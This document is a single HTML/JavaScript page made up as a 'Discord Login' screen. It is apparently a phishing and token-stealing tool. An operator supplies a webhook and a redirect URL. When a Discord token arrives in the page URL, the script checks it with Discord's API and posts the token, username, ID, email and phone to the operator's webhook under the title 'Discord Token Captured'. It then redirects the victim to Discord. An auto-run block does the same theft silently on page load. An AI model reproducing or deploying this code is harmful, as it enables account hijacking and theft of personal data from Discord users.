<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login</title>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: #313338; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0;
        }
        .container {
            background: #1e1f22;
            border-radius: 16px;
            padding: 40px;
            max-width: 450px;
            width: 90%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .logo {
            font-size: 48px;
            color: #5865F2;
            margin-bottom: 20px;
        }
        h2 {
            color: #dbdee1;
            font-weight: 500;
            margin-bottom: 8px;
        }
        p {
            color: #b5bac1;
            font-size: 14px;
            margin-bottom: 24px;
        }
        #qr {
            background: white;
            padding: 20px;
            border-radius: 12px;
            display: inline-block;
            margin-bottom: 20px;
        }
        .status {
            color: #dbdee1;
            font-size: 14px;
            margin-top: 12px;
        }
        .status .dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #23a55a;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }
        .input-group label {
            color: #b5bac1;
            font-size: 12px;
            display: block;
            margin-bottom: 4px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #3f4147;
            background: #1e1f22;
            color: #dbdee1;
            border-radius: 8px;
            font-size: 14px;
        }
        .input-group input:focus {
            outline: none;
            border-color: #5865F2;
        }
        .btn {
            background: #5865F2;
            color: white;
            border: none;
            padding: 12px 40px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #4752c4;
        }
        .btn.danger {
            background: #ed4245;
        }
        .btn.danger:hover {
            background: #c03537;
        }
        #qr-container {
            display: none;
        }
        .webhook-status {
            color: #23a55a;
            font-size: 12px;
            margin-top: 8px;
        }
        .webhook-status.error {
            color: #ed4245;
        }
        .token-display {
            background: #1e1f22;
            border: 1px solid #3f4147;
            border-radius: 8px;
            padding: 10px;
            margin-top: 12px;
            word-break: break-all;
            color: #dbdee1;
            font-size: 11px;
            text-align: left;
            display: none;
            max-height: 150px;
            overflow: auto;
        }
        .token-display.show {
            display: block;
        }
        .footer {
            margin-top: 20px;
            color: #4e5058;
            font-size: 12px;
        }
        .logs {
            margin-top: 16px;
            background: #0b0b0d;
            border-radius: 8px;
            padding: 10px;
            max-height: 150px;
            overflow: auto;
            text-align: left;
            color: #b5bac1;
            font-size: 11px;
            font-family: monospace;
            display: none;
        }
        .logs.show {
            display: block;
        }
        .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid #1e1f22;
        }
        .log-entry.success {
            color: #23a55a;
        }
        .log-entry.error {
            color: #ed4245;
        }
        .log-entry.info {
            color: #5865F2;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">💬</div>
        <h2>Discord Login</h2>
        <p>Scan QR code with Discord mobile app</p>
        
        <div id="setup">
            <div class="input-group">
                <label>Webhook URL</label>
                <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
            </div>
            <div class="input-group">
                <label>Redirect URL (after scan)</label>
                <input type="text" id="redirect" placeholder="https://discord.com/app" value="https://discord.com/app">
            </div>
            <button class="btn" onclick="generateQR()">Generate QR Code</button>
            <div id="webhook-status"></div>
        </div>
        
        <div id="qr-container">
            <div id="qr"></div>
            <div class="status">
                <span class="dot"></span>
                <span id="status-text">Waiting for scan...</span>
            </div>
            <div id="token-display" class="token-display"></div>
            <div id="logs" class="logs"></div>
            <div style="margin-top:16px; display:flex; gap:8px;">
                <button class="btn danger" onclick="reset()" style="flex:1;">Reset</button>
            </div>
        </div>
        <div class="footer">Discord QR Login • v2.0</div>
    </div>

    <script>
        let qrCode = null;
        let intervalId = null;
        let captured = false;

        function addLog(message, type = 'info') {
            const logs = document.getElementById('logs');
            logs.className = 'logs show';
            const entry = document.createElement('div');
            entry.className = 'log-entry ' + type;
            entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + message;
            logs.appendChild(entry);
            logs.scrollTop = logs.scrollHeight;
        }

        function generateQR() {
            const webhook = document.getElementById('webhook').value.trim();
            const redirect = document.getElementById('redirect').value.trim() || 'https://discord.com/app';
            const status = document.getElementById('webhook-status');
            
            if (!webhook) {
                status.textContent = 'Please enter a webhook URL';
                status.className = 'webhook-status error';
                return;
            }

            const url = window.location.href.split('?')[0];
            
            document.getElementById('setup').style.display = 'none';
            document.getElementById('qr-container').style.display = 'block';
            document.getElementById('logs').className = 'logs';
            document.getElementById('logs').innerHTML = '';
            
            if (qrCode) {
                qrCode.clear();
                qrCode.makeCode(url);
            } else {
                qrCode = new QRCode(document.getElementById('qr'), {
                    text: url,
                    width: 200,
                    height: 200,
                    colorDark: '#000000',
                    colorLight: '#ffffff',
                    correctLevel: QRCode.CorrectLevel.H
                });
            }
            
            document.getElementById('status-text').textContent = 'Scan with Discord mobile app';
            document.getElementById('token-display').className = 'token-display';
            document.getElementById('token-display').textContent = '';
            captured = false;
            
            localStorage.setItem('webhook', webhook);
            localStorage.setItem('redirect', redirect);
            
            addLog('QR code generated', 'info');
            addLog('Waiting for scan...', 'info');
            
            if (intervalId) clearInterval(intervalId);
            
            intervalId = setInterval(() => {
                if (captured) return;
                
                const params = new URLSearchParams(window.location.search);
                const token = params.get('token');
                
                if (token && token.length > 50) {
                    captured = true;
                    clearInterval(intervalId);
                    document.getElementById('status-text').textContent = '✅ Token captured!';
                    addLog('Token captured from URL', 'success');
                    
                    fetch('https://discord.com/api/v9/users/@me', {
                        headers: { 'Authorization': token }
                    })
                    .then(res => res.json())
                    .then(user => {
                        if (user.id) {
                            addLog('User verified: ' + user.username + '#' + (user.discriminator || '0'), 'success');
                            
                            const embed = {
                                embeds: [{
                                    title: 'Discord Token Captured',
                                    color: 0x5865F2,
                                    fields: [
                                        { name: 'Token', value: '```' + token + '```', inline: false },
                                        { name: 'Username', value: user.username + '#' + (user.discriminator || '0'), inline: true },
                                        { name: 'User ID', value: user.id, inline: true }
                                    ]
                                }]
                            };
                            
                            if (user.email) {
                                embed.embeds[0].fields.push({ name: 'Email', value: user.email, inline: true });
                            }
                            if (user.phone) {
                                embed.embeds[0].fields.push({ name: 'Phone', value: user.phone, inline: true });
                            }
                            if (user.bio) {
                                embed.embeds[0].fields.push({ name: 'Bio', value: user.bio.substring(0, 100), inline: false });
                            }
                            
                            const savedWebhook = localStorage.getItem('webhook');
                            if (savedWebhook) {
                                addLog('Sending to webhook...', 'info');
                                fetch(savedWebhook, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify(embed)
                                })
                                .then(res => {
                                    if (res.ok) {
                                        addLog('Token sent to webhook successfully!', 'success');
                                        document.getElementById('status-text').textContent = '✅ Token sent to webhook!';
                                    } else {
                                        addLog('Webhook failed: ' + res.status, 'error');
                                        document.getElementById('status-text').textContent = '⚠️ Webhook failed';
                                    }
                                })
                                .catch(() => {
                                    addLog('Webhook connection failed', 'error');
                                    document.getElementById('status-text').textContent = '⚠️ Webhook failed';
                                });
                            }
                            
                            const display = document.getElementById('token-display');
                            display.textContent = 'Token: ' + token + '\nUser: ' + user.username + '#' + (user.discriminator || '0') + '\nID: ' + user.id;
                            if (user.email) display.textContent += '\nEmail: ' + user.email;
                            if (user.phone) display.textContent += '\nPhone: ' + user.phone;
                            display.className = 'token-display show';
                            
                            const savedRedirect = localStorage.getItem('redirect');
                            if (savedRedirect) {
                                addLog('Redirecting to: ' + savedRedirect, 'info');
                                setTimeout(() => {
                                    window.location.href = savedRedirect;
                                }, 3000);
                            }
                        } else {
                            addLog('Invalid token - user not found', 'error');
                        }
                    })
                    .catch(() => {
                        addLog('Failed to verify token with Discord API', 'error');
                        document.getElementById('status-text').textContent = '⚠️ Token invalid';
                    });
                }
            }, 500);
        }

        function reset() {
            if (intervalId) clearInterval(intervalId);
            captured = false;
            document.getElementById('setup').style.display = 'block';
            document.getElementById('qr-container').style.display = 'none';
            document.getElementById('webhook-status').textContent = '';
            document.getElementById('webhook-status').className = 'webhook-status';
            if (qrCode) {
                qrCode.clear();
            }
            document.getElementById('token-display').className = 'token-display';
            document.getElementById('token-display').textContent = '';
            document.getElementById('logs').className = 'logs';
            document.getElementById('logs').innerHTML = '';
            
            const url = window.location.href.split('?')[0];
            window.history.replaceState({}, document.title, url);
        }

        // Auto-detect token in URL
        (function autoDetect() {
            const params = new URLSearchParams(window.location.search);
            const token = params.get('token');
            
            if (token && token.length > 50) {
                const savedWebhook = localStorage.getItem('webhook');
                const savedRedirect = localStorage.getItem('redirect');
                
                if (savedWebhook) {
                    fetch('https://discord.com/api/v9/users/@me', {
                        headers: { 'Authorization': token }
                    })
                    .then(res => res.json())
                    .then(user => {
                        if (user.id) {
                            const embed = {
                                embeds: [{
                                    title: 'Discord Token Captured',
                                    color: 0x5865F2,
                                    fields: [
                                        { name: 'Token', value: '```' + token + '```', inline: false },
                                        { name: 'Username', value: user.username + '#' + (user.discriminator || '0'), inline: true },
                                        { name: 'User ID', value: user.id, inline: true }
                                    ]
                                }]
                            };
                            
                            if (user.email) {
                                embed.embeds[0].fields.push({ name: 'Email', value: user.email, inline: true });
                            }
                            if (user.phone) {
                                embed.embeds[0].fields.push({ name: 'Phone', value: user.phone, inline: true });
                            }
                            
                            fetch(savedWebhook, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(embed)
                            });
                            
                            if (savedRedirect) {
                                setTimeout(() => {
                                    window.location.href = savedRedirect;
                                }, 2000);
                            }
                        }
                    })
                    .catch(() => {});
                }
            }
        })();

        // Load saved settings
        const savedWebhook = localStorage.getItem('webhook');
        if (savedWebhook) {
            document.getElementById('webhook').value = savedWebhook;
        }
        const savedRedirect = localStorage.getItem('redirect');
        if (savedRedirect) {
            document.getElementById('redirect').value = savedRedirect;
        }
    </script>
</body>
</html>
